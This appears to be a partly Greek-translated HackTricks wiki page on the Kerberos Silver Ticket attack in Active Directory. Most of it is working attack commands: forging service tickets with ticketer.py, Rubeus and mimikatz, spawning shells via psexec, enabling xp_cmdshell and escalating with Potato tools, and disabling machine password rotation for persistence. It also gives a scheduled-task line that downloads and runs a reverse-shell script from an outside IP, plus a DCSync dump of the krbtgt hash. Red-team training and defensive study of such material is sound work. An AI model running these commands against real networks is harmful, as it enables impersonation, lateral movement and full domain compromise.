# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

Για τη δημιουργία των tickets, χρησιμοποιούνται διαφορετικά εργαλεία ανάλογα με το λειτουργικό σύστημα:

### Σε Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Στα Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Η υπηρεσία CIFS επισημαίνεται ως κοινός στόχος για πρόσβαση στο σύστημα αρχείων του θύματος, αλλά άλλες υπηρεσίες όπως HOST και RPCSS μπορούν επίσης να εκμεταλλευτούνται για εργασίες και ερωτήματα WMI.

### Παράδειγμα: MSSQL υπηρεσία (MSSQLSvc) + Potato σε SYSTEM

Εάν έχετε το NTLM hash (ή το AES key) ενός λογαριασμού υπηρεσίας SQL (π.χ. sqlsvc), μπορείτε να πλαστογραφήσετε ένα TGS για το MSSQL SPN και να προσωμοιώσετε οποιονδήποτε χρήστη στην υπηρεσία SQL. Από εκεί, ενεργοποιήστε το xp_cmdshell για να εκτελέσετε εντολές ως ο λογαριασμός υπηρεσίας SQL. Εάν αυτό το token έχει SeImpersonatePrivilege, αλυσοδέστε ένα Potato για να αναβαθμίσετε σε SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Εάν το προκύπτον πλαίσιο έχει SeImpersonatePrivilege (συχνά αληθές για service accounts), χρησιμοποίησε μια παραλλαγή Potato για να αποκτήσεις SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Περισσότερες λεπτομέρειες για την κατάχρηση του MSSQL και την ενεργοποίηση του xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Επισκόπηση τεχνικών Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Διαθέσιμες Υπηρεσίες

| Τύπος Υπηρεσίας                           | Υπηρεσία Silver Tickets                                                    |
| ---------------------------------------- | -------------------------------------------------------------------------- |
| WMI                                      | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                      | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                    | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                          | HOST                                                                       |
| Windows File Share, also psexec          | CIFS                                                                       |
| LDAP operations, included DCSync         | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                           | krbtgt                                                                     |

Χρησιμοποιώντας **Rubeus** μπορείτε να ζητήσετε όλα αυτά τα tickets χρησιμοποιώντας την παράμετρο:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event IDs για Silver tickets

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon

## Διατήρηση πρόσβασης

Για να αποφύγετε τα μηχανήματα από το να αλλάζουν τον κωδικό τους κάθε 30 ημέρες ορίστε `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ή μπορείτε να ορίσετε `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` σε μια τιμή μεγαλύτερη από 30 ημέρες για να υποδείξετε την περίοδο περιστροφής στην οποία πρέπει να περιστραφεί ο κωδικός του μηχανήματος.

## Κατάχρηση Service tickets

Στα ακόλουθα παραδείγματα ας υποθέσουμε ότι το ticket αποκτήθηκε προσωποποιώντας τον λογαριασμό διαχειριστή.

### CIFS

Με αυτό το ticket θα μπορέσετε να αποκτήσετε πρόσβαση στους φακέλους `C$` και `ADMIN$` μέσω **SMB** (εφόσον είναι εκτεθειμένοι) και να αντιγράψετε αρχεία σε μέρος του απομακρυσμένου filesystem απλώς κάνοντας κάτι σαν:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Θα μπορείτε επίσης να αποκτήσετε shell στον host ή να εκτελέσετε αυθαίρετες εντολές χρησιμοποιώντας **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Με αυτήν την άδεια μπορείτε να δημιουργήσετε scheduled tasks σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Με αυτά τα tickets μπορείτε να **εκτελέσετε WMI στο σύστημα του θύματος**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Βρείτε **περισσότερες πληροφορίες για wmiexec** στην παρακάτω σελίδα:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Με πρόσβαση winrm σε έναν υπολογιστή μπορείτε να **έχετε πρόσβαση σε αυτόν** και ακόμη να αποκτήσετε ένα PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Ελέγξτε την παρακάτω σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης με έναν απομακρυσμένο host χρησιμοποιώντας winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Σημειώστε ότι **το winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να έχετε πρόσβαση.

### LDAP

Με αυτό το προνόμιο μπορείτε να κάνετε dump στη βάση δεδομένων του DC χρησιμοποιώντας **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Μάθετε περισσότερα για το DCSync** στην παρακάτω σελίδα:


{{#ref}}
dcsync.md
{{#endref}}


## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
